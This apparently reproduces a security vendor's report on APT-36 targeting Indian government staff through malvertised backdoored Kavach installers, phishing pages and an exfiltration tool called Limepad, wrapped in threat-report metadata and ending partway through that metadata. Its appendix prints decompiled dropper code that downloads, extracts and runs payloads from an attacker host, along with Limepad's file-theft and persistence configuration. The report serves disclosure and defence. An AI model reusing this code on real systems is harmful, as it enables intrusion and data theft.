{
    "id": "c2e1d9d5-69cb-441b-a228-38c830bad45e",
    "created_at": "2024-01-31T02:06:14.91717Z",
    "updated_at": "2025-03-27T02:17:01.591251Z",
    "deleted_at": null,
    "sha1_hash": "4890934ae6fa2e26959574d125ffeb519784672d",
    "title": "",
    "authors": "",
    "file_creation_date": "2024-01-30T06:11:54Z",
    "file_modification_date": "2024-01-30T06:11:54Z",
    "file_size": 2655744,
    "plain_text": "# Indian Governmental Organizations Targeted by APT-36\n\n**[zscaler.com/blogs/security-research/apt-36-uses-new-ttps-and-new-tools-target-indian-governmental-organizations](https://www.zscaler.com/blogs/security-research/apt-36-uses-new-ttps-and-new-tools-target-indian-governmental-organizations)**\n\nSudeep Singh\n\n## Summary\n\nAPT-36 (also known as Transparent Tribe) is an advanced persistent threat group\nattributed to Pakistan that primarily targets users working at Indian government\norganizations. Zscaler ThreatLabz has been closely monitoring the activities of this group\nthroughout 2022. Our tracking efforts have yielded new intelligence about this APT group\nthat has not previously been documented.\n\nIn this blog, we will describe how this group abuses Google advertisements for the\npurpose of malvertising to distribute backdoored versions of Kavach multi-authentication\n(MFA) applications. We will shed light on the complete details of the attack chain that\nhave not been previously shared in the public domain. This threat group has also\nconducted very low-volume credential harvesting attacks masquerading as official Indian\ngovernment websites, and luring unsuspecting users to enter their credentials.\n\nWe will also describe the functionalities of a completely new data exfiltration tool that we\nhave discovered being used by the APT-36 group. We've dubbed this tool \"Limepad.\"\n\n## Key points\n\nAPT-36 group is a Pakistan-based advanced persistent threat group which has\nspecifically targeted employees of Indian government related organizations.\n\nThis group has remained active throughout 2022 using various techniques such as\nmalvertising, and credential phishing attacks.\n\nAPT-36 has evolved their tactics, techniques and procedures (TTPs) incorporating\nnew distribution methods and new tools.\n\nThe threat actor registered multiple new domains hosting web pages masquerading\nas the official Kavach app download portal.\n\nThey abused the Google Ads paid search feature to push the malicious domains to\nthe top of Google search results for users in India.\n\nBeginning August 2022, the group started using a new data exfiltration tool which\nwe have named Limepad. This tool was previously undocumented.\n\n\n-----\n\nWhile most binaries used by APT-36 in this campaign will execute only if the user’s\nmachine is configured with India time zone (IST), we also found 2 binaries using the\nsame code base which included a time zone check for both - India and Sri Lanka.\nSince both India and Sri Lanka have the same time zone, we consider this check\nredundant.\n\nCredential harvesting attacks were used to spoof the National Informatics Center’s\nKavach login page with the goal of stealing credentials of government employees.\n\nSeveral instances involved malicious binaries compiled using PyInstaller and sent\npackaged inside VHDX archives.\n\n## Attack flow\n\nFigure 1 illustrates the end-to-end attack-chain of the distribution of backdoored Kavach\nmulti-factor authentication (MFA) applications. Each part of this attack-chain is explained\nin more details in the later sections of the blog.\n\n\n-----\n\n_Figure 1: Malvertising campaign used to distribute backdoored Kavach MFA apps_\n\n## Distribution mechanism\n\n**Malvertising**\n\nThe malvertising aspect of APT-36 group has not been previously documented, so in this\nblog we will shed some light on how the threat actor lures Indian government users to\ndownload backdoored Kavach multi-factor authentication (MFA) applications.\n\n\n-----\n\nThe threat actor routinely registered new domains and hosted web pages impersonating\nas the official Kavach application download portal. It then abused Google Ads’ paid\nsearch feature, to push malicious attacker-registered fake websites to the top of the\nsearch results returned by Google for Kavach-related keywords such as “Kavach\ndownload” and “Kavach app,” when searched from India.\n\nSeveral of these fake Kavach websites were promoted this way throughout 2022. On\naverage, the attacker promoted each website for a period of one month before cycling to\nthe next one.\n\nFigure 2 shows a calendar highlighting different times at which the threat actor was\nabusing Google ads to promote corresponding malicious sites\n\n_Figure 2: Calendar showing when the Google ads were run by APT-36_\n\nThe complete list of malicious websites impersonating the Kavach portal are listed in the\nIOCs section.\n\nFigure 3 and 4 show two examples of how the malicious search result ads looked like at\nthe time they were live.\n\n\n-----\n\n_Figure 3: Google advertisement to promote kavach-app[.]com_\n\n_Figure 4: Google advertisement to promote kavach-app[.]in_\n\nFigure 5 shows a web page impersonating the Kavach application download portal. The\nthreat actor leveraged Wordpress to host these webpages and the theme remained\nconsistent across all the malicious pages.\n\n\n-----\n\n_Figure 5: Attacker-registered site masquerading as Kavach app download portal_\n\n**Third party application stores**\n\nIn addition to this, we also discovered that this threat group controls certain third party\napplication stores which offer downloads for various applications. One such example is\nthe acmarketsapp[.]com store. While at first this site seems benign and appears to offer\ndownloads for generic applications only, we noticed that the threat actor added a few\nposts to download Indian government related applications such as Kavach and Hamraaz.\n\nUpon closer inspection and monitoring this website over a period of time, we uncovered\nthe following new TTPs.\n\n**Updating download links**\n\nThis app store is used as a gateway to redirect the users to attacker-registered domains\nhosting the backdoored versions of Kavach application. Each time the threat actor\nregistered a new malicious website, they would update the download link on the app store\nto point to the latest attacker-registered site.\n\nTo understand this better, we took snapshot of this website at different points of time in\n2022. By leveraging the web archive feature, it can be seen in Figure 6 that in May 2022,\nthe download link for Kavach on this app store pointed to kavach-app[.]com (which is a\nconfirmed attacker-registered domain used in the campaign).\n\n_Figure 6: Snapshot of malicious link on acmarketsapp[.]com in May 2022_\n\nA few months later in October 2022, the threat actor updated the link to point to another\nmalicious site (kavachauthentication.blogspot[.]com) as shown in Figure 7.\n\n\n-----\n\n_Figure 7: Snapshot of malicious link on acmarketsapp[.]com in October 2022_\n\n**Malvertising**\n\nThe app store - acmarketsapp[.]com itself is pushed to the top in Google search results\nfor certain search keywords from India by abusing the Google Ads paid search feature as\ndescribed earlier.\n\nBy combining these techniques, it allows APT-36 to operate these third party app stores\nas a gateway to redirect unsuspecting users to their malicious sites hosting the latest\nbackdoored variants of Indian government applications.\n\n## Technical analysis\n\n**A new data exfiltration tool - LimePad**\n\nWe recently identified a new and previously undocumented data exfiltration tool used by\nthis APT group. It is distributed as a Python-based application packaged inside a VHDX\nfile. Based on the unique strings present in the first iteration of this stealer, we have\nnamed it LimePad.\n\nIn this blog, we are sharing some of the key functionalities of this new tool. A more indepth technical analysis write up of this tool will be published by us as a follow-up blog\nsince we are still investigating their activities.\n\nSimilar to some of the other malicious binaries used by the SideCopy APT group in the\npast, this new tool is a PyInstaller-based payload as well. We found 2 unique examples of\nthe new tool in-the-wild, both of which were distributed inside very large VHDX files with\n\n\n-----\n\nsize greater than 60 MB, each.\n\nThe main purpose of this new tool is to constantly upload any new file of interest from the\nvictim's machine to the attacker's server. It synchronizes this file stealing operation\nbetween the victim's machine and the attacker's server by maintaining a local custom\nSQLite database. This database holds the latest records of all the files which are\nuploaded, in queue or newly modified. It is done to ensure that any new files or\nmodifications to existing local files are synced up with the remote server.\n\n**Time zone check**\n\nBefore starting any malicious activity, it checks whether the keyword \"india\" is present in\nthe timezone config of the machine. Due to this, the payload will execute only on\nmachines configured in India time zone.\n\nOnce it confirms that the user is located in India, it will download a decoy PDF from the\nattacker’s server which is displayed to the victim as a social engineering lure.\n\nWe analyzed the objects in the decoy PDF file to recover the metadata corresponding to\ngeneration of the PDF and we uncovered a key indicator which further helped us\ncorrelate this activity to APT-36 with a high-confidence.\n\nFigure 8 shows the metadata which indicates that this PDF was created with the author\nname: “Apolo Jones” and Microsoft Word 2016 was used to generate the PDF.\n\n_Figure 8: metadata of the decoy PDF file_\n\nThis is the same string present in the PDB path of multiple backdoored variants of\nKavach application used by APT-36 in 2022.\n\nOne such example is the backdoored Kavach binary with MD5 hash:\n6b552512c1b6479d8a8ae526663af864\n\nPDB path: C:\\Users\\Apolo Jones\\source\\repos\\Kavach\\obj\\Release\\Kavach.pdb\n\n\n-----\n\n**Key functionalities and configuration of Limepad**\n\nThis data exfiltration tool is modular and contains many custom Python libraries\ndeveloped by the attacker to assist the main functionality of LimePad. There is also a\nconfig file called \"control\" which is used by LimePad for its settings. The complete config\nfile is available in the Appendix. Below we give a brief overview of the config fields which\ncan help understand the features and functionalities of this stealer at a high-level.\n\nVERSION field is configured as \"0.1-18\". This indicates that the tool is in very early\nstages of development by the threat actor.\n\nUSERFILE defines the name of the local SQLite database which is used to keep track of\nthe file sync operations. In the first version of this tool, it was configured as \"Limepad.db\"\ndue to which we have named this tool as \"Limepad\"\n\nThe fields, STARTDATA, LOCKDOORS, and DOORS are used to create a Windows URL\nShortcut file which is used for the purpose of persistence. This URL shortcut file is placed\nin the Windows Startup directory with the name: \"Limepad.dll\" and it points to the local file\npath of the malicious payload as shown below.\n\n**[InternetShortcut]**\n**URL=file:///<path_to_malicious_binary>**\n\nA similar persistence mechanism was used by another tool in SideCopy APT's arsenal in\n2021.\n\nSERVERS field is used to configure an array of attacker-controlled C2 servers. In both\nthe identified samples, only one C2 server was configured each time. However, the code\nhas support for multiple C2 servers and will cycle through them until it finds a working C2\nserver.\n\nDUSSEN field contains a hex-encoded version of the string - \"india\". This is what is used\nfor the India time zone check in the main subroutine of Limepad before starting any\nmalicious activity.\n\nThe fields - DBTABLES, DBTABLES_INDEXES and SYNC_RULES_CONFIG all\ncorrespond to the structure and configuration of the tables in the local SQLite database.\n\nFigure 9 shows the structure of the local SQLite database used for synchronizing files\nbetween infected machine and server.\n\n\n-----\n\n_Figure 9: Structure of the local SQLite database_\n\nFigure 10 shows an example of contents of the SQLite database on an infected VM.\n\n_Figure 10: Contents of a database from an infected VM_\n\nIt is important to note that \"SYNC_RULES_CONFIG\" contains a set of rules which\ndefines which files the attacker is interested in stealing.\n\nIt has a different set of file extensions configured for HOME, FIXED and REMOVABLE\ndrives. Based on the configured file extensions, it is evident that the threat actor is\ninterested in stealing documents (PDF, text and MS Office files), email local databases\n(DBX format) and various drawing file extensions such as DWG and DXF. These drawing\nfile extensions correspond to \"AutoCAD\" or computer-aided design vector files.\n\n## Network communication\n\nBelow are the main steps in network communication of LimePad. It is important to note\nthat in all cases, the user-agent used in network communication corresponds to the\nPython application. In this case - \"Python-urllib/2.7\". This might change in future since the\nattacker can configure a custom user-agent to blend in with legit browser communication.\n\nAlso, in each request to the server, an HTTP request header field called \"Auth_Token\" will\nbe present. This is used to authenticate with the C2 server. This value is the same as the\npassword which is also sent in the HTTP request. This 32 characters password is\ngenerated by base64-encoding the random value generated by os.random() using the\nfollowing code.\n\npassword = base64.urlsafe b64encode(os.urandom(30))[:32]\n\n\n-----\n\nFigure 11 below shows the sequence of network requests sent by the data exfiltration\ntool.\n\n_Figure 11: network traffic from the data exfiltration tool_\n\nBelow is a brief description of the different stages of network requests.\n\n**Server check**\n\nSends a GET request to the file bind.php on the server. Once the server responds with\n\"pong!\", it indicates the configured server is working well.\n\n**Registration of infected machine with the server**\n\nSends a POST request to the file \"information.php\" on the server with the credentials\nused to register the infected machine. The username and password are sent as both HTTP POST request body and HTTP request headers.\n\n\"Username\" and \"Auth_Token\" fields in request headers correspond to the username and\npassword respectively.\n\nPOST body format is: USERNAME=<username>&PASSWORD=<password>\n\nThis is followed by a GET request to \"information.php\" to confirm user registration.\n\n**Uploading files to the server**\n\nEach file upload request is in the form of HTTP POST request to the file \"adjustfile.php\"\non the server. The local file path is included in the URL. The contents of the file are\nuploaded in plaintext.\n\n\n-----\n\n## Miscellaneous threat intel\n\nAs we indicated earlier, we are still investigating this case. We obtained the list of all the\ninfected machines registered with the attacker’s server. Figure 12 below shows a preview\nof the latest information. By looking at the usernames of the infected machines, it further\nconfirmed to us that only the users in India were infected.\n\n_Figure 12: List of infected machines registered with the attacker’s server_\n\n## Kavach payload analysis\n\nAs mentioned above in the distribution mechanism section, this threat actor uses various\nmalvertising methods to lure unsuspecting Indian government employees to download a\nbackdoored version of the Kavach multi-factor authentication (MFA) application.\n\nFor the purpose of technical analysis we will consider the fake installer with the MD5\nhash: faeb19cd668de953afd6f2c953251665\n\n\n-----\n\n**Stage-1: Fake Installer**\n\nThe fake installer is a .NET binary which masquerades as a legit Kavach application\ninstaller and uses fake metadata information. Moreover, the binary uses an icon related to\nthe National Informatics Center(NIC) which is an Indian government department under\nthe Ministry of Electronics and Information Technology.\n\nOn execution, the binary performs following operations:\n\n1. Performs the time zone check and executes further only if the time zone matches\nIndian Standard Time (IST).\n2. Extracts and drops the legit Kavach installer in the path \"C:\\ProgramData\\KavachAuth\\\". The installer is extracted from the resource section of the binary.\n3. Downloads and drops the Stage-2 payload from the URL\n\"http://139.59.79[.]86/hardwell.mp3\" in the path \"C:\\ProgramData\\KavachAuth\\hardwell.mp3\"\n4. Executes the dropped legit Kavach installer\n5. Moves the dropped Stage-2 payload to the path \"C:\\ProgramData\\KavachAuth\\archiveviewer.scr\"\n6. Executes the dropped Stage-2 payload\n\n**Stage-2: PyInstaller compiled binary**\n\nThe Stage-2 payload is a Python script compiled to an executable using PyInstaller. For\nanalysis we extracted the Python script which we have included in the Appendix section.\n\nThe script on execution does following major operations:\n\n1. Creates the directory \"c:\\programdata\\WUDFHost\"\n2. Creates a log file in the path \"c:\\programdata\\WUDFHost\\logs.txt\" which is updated\naccording to the operations performed during further execution.\n3. Performs the time zone check.\n4. Downloads, drops and executes the next stage payload.\n\nFor the next stage payload, if the path\n\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\" exists, then the payload is\ndownloaded from the URL \"http://139.59.79[.]86/WUDFHost45.zip\" in the path\n\"c:\\programdata\\WUDFHost45.zip\" else it is downloaded from the URL\n\"http://139.59.79[.]86/WUDFHost35.zip\" in the path \"c:\\programdata\\WUDFHost35.zip\"\n\nThe downloaded payload which is a ZIP file is extracted to path\n“c:\\programdata\\WUDFHost”. For the payload analyzed, the archive contained three\ncomponents:\n\n\n-----\n\n1. Executable (WUDFAgent.exe) - The loader binary\n2. DLL (oraclenotepad45.dll) - Main backdoor\n3. DLL (dotsqueeze.dll) - Helper DLL\n\n**Stage-3: Loader**\n\nThe Stage-2 Python script executes the loader binary. The loader pretends to be a POS\napplication which on execution does following operations:\n\n1. Creates a log file in the path \"c:\\\\programdata\\\\WUDFHost\\\\process.txt\"\n2. Loads the assembly from the path \"c:\\\\programdata\\\\WUDFHost\\\\oraclenotepad45.dll\"\n3. Creates a fake file in the path \"c:\\\\\\\\programdata\\\\\\\\Expense_Account_Hierarchy.csv\"\nand writes fake information to it. The information written is extracted from the resource\nsection.\n4. Pass the execution control to the loaded assembly\n\n**Stage-4: Backdoor**\n\nThe assembly loaded by the loader is the main backdoor of the infection chain. Similar to\nPython script. We will not cover the full technical analysis for the backdoor payload since\nit's already covered in some public blog posts but in brief, it contains following\nfunctionalities:\n\n1. Taking snapshots\n2. Downloading new payloads and executing them\n3. Creating persistence\n4. Exfiltrating user and system information\n5. Exfiltrating file and directory information\n\nThe backdoor also uses a helper DLL where the malware author has delegated\nfunctionalities like file download from network, writing file to disk, creating new processes.\n\n## Credential harvesting attack\n\nOne of the key targets of APT-36 is the Indian government and it targets the government\nusers with various Kavach related themes including credential harvesting attacks. These\ncredentials can further be re-used by the threat actor to gain access to government\nrelated infrastructure.\n\nA domain with the name nic-updates[.]in was registered on 25th August 2022 and it\nimpersonated the official login page of NIC (National Informatics Center).\n\nThis domain redirected to the malicious login page only when accessed from an Indian IP\naddress, else it redirected to the legitimate official domain of NIC - nic.in\n\n\n-----\n\nFigure 13 shows the credential phishing page.\n\n_Figure 13: Credential phishing page impersonating as Kavach NIC_\n\nIt is important to note that the phishing URL was well-crafted as it mimicked the full URL\npath of the legit Kavach NIC login page.\n\nFake login page URL:\n\nhxxps://kavach.mail.nic-updates[.]in/mfid/secureLogin_showSecureLogin.action#!\n\nLegit login page URL:\n\nhxxps://kavach.mail.gov[.]in/mfid/secureLogin_showSecureLogin.action#!\n\nThe phishing page sent the stolen credentials using an HTTP POST request to a file error.php hosted on the attacker’s server.\n\nThe attacker’s server was using Zimbra and it even had an open directory hosted at the\nURL: hxxps://kavach.mail.nicupdates[.]in/mfid/secureLogin_showSecureLogin.action/web/\n\nFigure 14 shows the contents of the open directory.\n\n\n-----\n\n_Figure 14: Open directory on the server hosting the Kavach phishing page_\n\nThe image file - kavach.jpg in the above open directory stood out based on the file\ncreation date. We pivoted on this image file’s hash, and observed that the same image\nwas also referenced from kavach-app[.]com (a domain which we previously attributed to\nAPT-36 group).\n\nWe also identified another phishing site (kavachmail-govin.rf[.]gd) used by this group\nusing the same theme and code base.\n\n## Zscaler detection status\n\nZscaler’s multilayered cloud security platform detects indicators at various levels, as seen\nhere:\n\n[Win32.Payload.Limepad](https://threatlibrary.zscaler.com/?keyword=Win32.Payload.Limepad)\n[Win64.Payload.Limepad](https://threatlibrary.zscaler.com/?keyword=Win64.Payload.Limepad)\n[Win32.Downloader.CrimsonRat](https://threatlibrary.zscaler.com/?keyword=Win32.Downloader.CrimsonRat)\n[Win32.Backdoor.SideCopy](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.SideCopy)\n[HTML.Phish.TransparentTribe](https://threatlibrary.zscaler.com/?keyword=HTML.Phish.TransparentTribe)\n\n## Conclusion\n\nAPT-36 continues to be one of the most prevalent advanced persistent threat groups\nfocused on targeting users working in Indian governmental organizations. As described in\nthis blog, they leverage various tactics to lure the victims.\n\nThis group has continued evolving its tactics, techniques and procedures (TTPs) while\nadding new tools to the arsenal. Applications used internally at the Indian government\norganisations are a popular choice of social engineering theme used by APT-36 groups.\nUsers should exercise caution while downloading applications and always ensure to\ndownload the applications only from official sources.\n\n\n-----\n\nSince APT-36 leverages malvertising to hijack the Google search results, we advise the\nusers to be extra careful when clicking on links on Google search results and always\nverify that they are indeed visiting the official website.\n\nWe continue to closely monitor the latest developments of this APT group and ensure to\nprotect our customers against these threats.\n\n## Indicators of compromise\n\n**Limepad C2 domains**\n\nncloudup[.]com\ngcloudsvc[.]com\n\n**Credential harvesting sites**\n\nnic-updates[.]in\nkavachmail-govin[.]rf[.]gd\n\n**Attacker-registered domains spoofing Kavach site**\n\nkavach-app[.]com\nkavachguide[.]com\nkavach-app[.]in\nget-kavach[.]in\ngetkavach[.]com\nkavachsupport[.]com\nkavachdownload[.]in\nkavachauthentication.blogspot[.]com\n\n**Post-infection IOCs**\n\n139.59.79[.]86 139.59.79[.]86/song.mp3\n139.59.79[.]86/OneDriveHandler45_bf.zip\n139.59.79[.]86/OneDriveHandler45.zip\n139.59.79[.]86/C2L!Dem0&PeN/A@llPack3Ts/Cert.php\nwzxdao[.]com\nwzxdao[.]com/onedrivehandlerx86.zip\nwzxdao[.]com/OnrDriveHandlerx86.zip\n\n**Decoy file URLs**\n\nhxxp://139.59.23[.]88/confirmation_id.pdf\nhxxps://ncloudup[.]com/trendmic/details.pdf\nhxxp://wzxdao[.]com/resultupdate.jpg\n\n\n-----\n\nhttp://139.59.79[.]86/Pictures.jpg\n\n**File hashes**\n\n**File MD5 hash** **Filename**\n\n123b180ed44531bfbac27c6eb0bbe01d Update Portal.vhdx\n\n3817590cf8bec4a768bb84405590272f Student online update.exe\n\n0ed6451ffe34217e44355706f4900ecc NvidiaUpdate (2).scr\n\n94daa776792429d1cb65edc1d525e2fc Student detail.vhdx\n\nc195d6bb06c93b94d39e5c1a2dfc6792 Confirmation_ID.vhdx\n\n889c5c98e88c4889220617f57f5480f7 details.exe\n\nac3f2c8563846134bb42cb050813eac8 Confirmation_ID.exe\n\n## Appendix\n\n**Limepad config file**\n\nimport os, logging\nfrom regulator import FileMatcher as r\nimport sys\nQUERY = []\nUSERHOME = os.path.join(os.environ['HOMEDRIVE'], os.environ['HOMEPATH'])\n\nclass FILEFLAG:\nQUEUED, SYNCING, SYNCED, IGNORED = range(4)\n\nVERSION = '0.1-$Revision: 18 $'\nVERSION = VERSION.replace('$', '').replace('Revision: ', '').strip()\nSTARTDATA = os.path.join(os.environ['APPDATA'], 'Microsoft\\\\Windows\\\\Start\nMenu\\\\Programs\\\\Startup\\\\Limepad')\nROOTDATA = os.path.join(os.environ['APPDATA'], 'Limepad')\nUSERFILE = 'Limepad.db'\n\n\n-----\n\nUSERFILE = os.path.join(ROOTDATA, USERFILE)\nLOGFILE = 'Limepad.log'\nLOGFILE = os.path.join(os.environ['APPDATA'], LOGFILE)\nTEMP_UPLOAD_FOLDER = os.path.join(ROOTDATA, 'tup')\nLOCKDOORS = 'URL=file:///' + sys.executable\nDOORS = ['.dll', '.url']\nSERVERS = [<server_address>]\nDUSSEN = '696E646961'\nSERVER_PUBKEY = ''\nDBTABLES = {'file': [('path', 'VARCHAR'), ('filename', 'VARCHAR'), ('size', 'INT'), ('state',\n'INT'), ('modified', 'REAL'), ('created', 'REAL'), ('queuepriority', 'INT'), ('defertill', 'INT\nDEFAULT 0'), ('rpath', 'VARCHAR DEFAULT NULL')], 'syncdirs': [\n('path', 'VARCHAR'), ('rule', 'VARCHAR')],\n'config': [\n('key', 'VARCHAR'), ('value', 'VARCHAR')]}\nDBTABLES_INDEXES = {'file': ('queuepriority', 'unique: path, filename'), 'config': ('unique:\nkey', )}\nSYNC_RULES_CONFIG = {'HOME': r(\" '*.pdf' or '*.txt' or '*.doc*' or '*.xls*' or '*.ppt*' or\n'*.mdb*' or '*.dwg' or '*.dxf' or '*.dbx' \"),\n'FIXED': r(\" '*.pdf' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dbx' \"),\n'REMOVABLE': r(\" size < 5 mb if ('*.jpg' or '*.jpeg' or '*.avi') else (size < 100 mb and\n('*.pdf' or '*.txt' or '*.doc*' or '*.xls*' or '*.ppt*' or '*.mdb*' or '*.dwg' or '*.dxf'))\")}\nOPTIMIZED_SEND_BLOCKSIZE = 256000\nLOG_LEVEL = logging.WARN\nlogging.basicConfig(filename=LOGFILE, level=LOG_LEVEL)\nif __name__ == '__main__':\nprint globals()\n\n**Kavach fake installer - Python decompiled code**\n\nimport os\nfrom win32com.client import Dispatch\nimport platform\nimport time\n#from tzlocal import get_localzone\nimport sys\nfrom os.path import exists as file_exists\nimport urllib\nimport time\nfrom time import sleep\nimport zipfile\n#import win32com.client as win32\nimport win32com as win32\n\n\n-----\n\nimport subprocess\ndef is_os_64bit():\nreturn platform.machine().endswith('64')\n\ndef append_me(text):\nwith open(\"c:\\programdata\\WUDFHost\\logs.txt\", \"a\") as myfile:\nmyfile.write(text)\n\ndef write_me(text):\nif file_exists(\"c:\\programdata\\WUDFHost\\logs.txt\") is True:\nprint('bab')\npass\nelse:\nprint('damn')\nwith open(\"c:\\programdata\\WUDFHost\\logs.txt\", \"w\") as myfile:\nmyfile.write(text)\n\ndef create_dir(text):\nif os.path.exists(text) is False:\nos.mkdir(text)\n\ndef download_us(url,path):\nif os.path.exists(path) is False:\nurllib.urlretrieve(url,path)\nelse:\nprint(\"skipping\")\nappend_me(\"skipping\")\n\ndef define_me(text):\ntry:\nif os.path.exists(text) is True:\nprint(\"zip file exists\")\nappend_me(\"zip file exists\")\nwith zipfile.ZipFile(text, 'r') as zip_ref:\nzip_ref.extractall(\"c:\\\\programdata\\\\WUDFHost\")\nelse:\n\nprint(\"not find extracted file\")\n\n\n-----\n\nappend_me(\"not find extracted file\")\nexcept Exception as e:\nprint(\"already running file\")\n\ndef deaf():\ntry:\nif os.path.exists(\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\") is True:\n\ndownload_us(\"http://<REDACTED>/WUDFHost45.zip\",\"c:\\\\programdata\\WUDFHost45.zip\")\ndefine_me(\"c:\\\\programdata\\\\WUDFHost45.zip\")\npass\nelse:\n\ndownload_us(\"http://<REDACTED>/WUDFHost35.zip\",\"c:\\\\programdata\\WUDFHost35.zip\")\ndefine_me(\"c:\\\\programdata\\\\WUDFHost35.zip\")\npass\nexcept Exception as e:\nprint(\"excption in deaf\")\n\ndef openWorkbook(xlapp, xlfile):\ntry:\nxlwb = xlapp.Workbooks(xlfile)\n#xlwb.Close(True)\nexcept Exception as e:\ntry:\nxlwb = xlapp.Workbooks.Open(xlfile)\n#xlwb.Close(True)\nexcept Exception as e:\nprint(e)\nxlwb = None\nreturn(xlwb)\n\ndef define_me_replica(text):\ntry:\nif os.path.exists(text) is True:\nprint(\"zip file exists\")\nappend_me(\"zip file exists\")\nusername = os.environ['USERNAME']\nprint(username)\n\nwith zipfile ZipFile(text 'r') as zip ref:\n\n\n-----\n\nzip_ref.extractall(\"c:\\\\users\\\\\"+username+\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start\nMenu\\\\Programs\\\\Startup\")\nelse:\nprint(\"not find extracted file\")\nappend_me(\"not find extracted file\")\nexcept Exception as e:\nprint(\"already running file\")\n\ndef def_frames():\ntry:\nif os.path.exists(\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\") is True:\n\ndownload_us(\"http://<REDACTED>/WUDFAgent_45.zip\",\"c:\\\\programdata\\\\WUDFAgent_45.zip\")\ndefine_me_replica(\"c:\\\\programdata\\\\WUDFAgent_45.zip\")\npass\nelse:\n\ndownload_us(\"http://<REDACTED>/WUDFAgent_35.zip\",\"c:\\\\programdata\\\\WUDFAgent_35.zip\")\ndefine_me_replica(\"c:\\\\programdata\\\\WUDFAgent_35.zip\")\npass\nexcept Exception as e:\npass\n\ndef patience_limit():\ntry:\nif os.path.exists(\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\") is True:\nsubprocess.Popen([\"c:\\\\programdata\\\\WUDFHost\\\\WUDFAgent.exe\"])\npass\nelse:\nsubprocess.Popen([\"c:\\\\programdata\\\\WUDFHost\\\\WUDFAgent.exe\"])\npass\nexcept Exception as e:\npass\n\nif __name__ == '__main__':\ntry:\ncreate_dir(\"c:\\programdata\\WUDFHost\")\nwrite_me(\"Starter\\n\")\n#list_folders = []\n#list_files = []\n#lines = ''\nusername = os.environ['USERNAME']\n#for root, dirs,files in os.walk('c:\\\\users\\\\'+username+'\\\\appdata',topdown=False):\n\n# for name in files:\n\n\n-----\n\n#    print(os.path.join(root,name))\n#    list_folders.append(os.path.join(root,name))\n#  for name in dirs:\n#    print(os.path.join(root,name))\n#    list_files.append(os.path.join(root,name))\nprint(\"Directory Created\")\nif '.py' not in sys.argv[0]:\n#create_dir(\"c:\\programdata\\WUDFHost\")\nprint(\"Directory Created\")\n\n#write_me(\"Starter\")\nprint(\"Log File Created\")\ntzname = time.tzname\n#local_tz = get_localzone()\nprint(\"Got the TimeZone\")\nappend_me(\"Got the TimeZone : \"+str(tzname) + \"\\n\")\nif \"sri lanka\" in str(tzname).lower() or \"india\" in str(tzname).lower():\nprint(\"Correctly Identified TimeZone\")\nif os.path.exists(\"c:\\\\Program Files\\\\Microsoft Office\\\\Office15\") is True or\nos.path.exists(\"c:\\\\Program Files\\\\Microsoft Office\\\\Office16\") is True:\nprint(\"Office is 2010 or 2016\")\nappend_me(\"Office is 2010 or 2016\\n\")\nif is_os_64bit():\nprint(\"Machine is x64\")\nappend_me(\"Machine is x64\\n\")\n\nappend_me(\"File Downloading Started\\n\")\nprint(\"File Downloading Started\")\n\n##def_frames()\n\nappend_me(\"All Files Downloaded\\n\")\nprint(\"All Files Downloaded\")\n\ndeaf()\n\n\n-----\n\nprint(\"Files Extracted\")\nappend_me(\"Files Extracted\\n\")\n\nprint(\"Going for always\")\nappend_me(\"going for always\")\n\nelse:\nprint(\"Machine is x86\")\nappend_me(\"Machine is x86\\n\")\n\n##def_frames()\nappend_me(\"All Files Downloaded\\n\")\nprint(\"All Files Downloaded\")\n\nprint(\"Going for always\")\nappend_me(\"going for always\")\ndeaf()\nprint(\"Files Extracted\")\nappend_me(\"Files Extracted\\n\")\n\nelse:\nprint(\"Other than Office 16 or Office 13\")\nappend_me(\"Other than Office 16 or Office 13\\n\")\n\n##def_frames()\n\nappend_me(\"All Files Downloaded\\n\")\nprint(\"All Files Downloaded\")\n\ndeaf()\nprint(\"Going for always\")\nappend_me(\"going for always\")\n\n\n-----\n\nprint(\"Files Extracted\")\nappend_me(\"Files Extracted\\n\")\nlist_folders = []\nlist_files = []\nfor root, dirs,files in os.walk('c:\\\\users\\\\'+username+'\\\\appdata',topdown=False):\nfor name in files:\nprint(os.path.join(root,name))\nlist_folders.append(os.path.join(root,name))\nfor name in dirs:\nprint(os.path.join(root,name))\nlist_files.append(os.path.join(root,name))\npatience_limit()\nelse:\nprint(\"Not the time Zone You want to run\")\nappend_me(\"Not the time Zone You want to run\\n\")\nelse:\nprint(\"Find my self in .py directory\")\nappend_me(\"Find my self in .py directory\\n\")\nexcept Exception as e:\n#append_me(str(e))\nprint(str(e))\nappend_me(str(e)+\"\\n\")\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2022/2022.11.03.APT-36/Indian%20Governmental%20Organizations%20Targeted%20by%20APT-36.pdf"
    ],
    "report_names": [
        "Indian Governmental Organizations Targeted by APT-36"
    ],
    "threat_actors": [
        {
            "id": "b584b10a-7d54-4d05-9e21-b223563df7b8",
            "created_at": "2022-10-25T16:07:24.181589Z",
            "updated_at": "2025-03-27T02:02:10.134233Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [],
            "source_name": "ETDA:SideCopy",
            "tools": [
                "ActionRAT",
                "AllaKore",
                "Allakore RAT",
                "AresRAT",
                "Bladabindi",
                "CetaRAT",
                "DetaRAT",
                "EpicenterRAT",
                "Jorik",
                "Lilith",
                "Lilith RAT",
                "MargulasRAT",
                "ReverseRAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "187a0668-a968-4cf0-8bfd-4bc97c02f6dc",
            "created_at": "2022-10-27T08:27:12.955905Z",
            "updated_at": "2025-03-27T02:00:55.41311Z",
            "deleted_at": null,
            "main_name": "SideCopy",
            "aliases": [
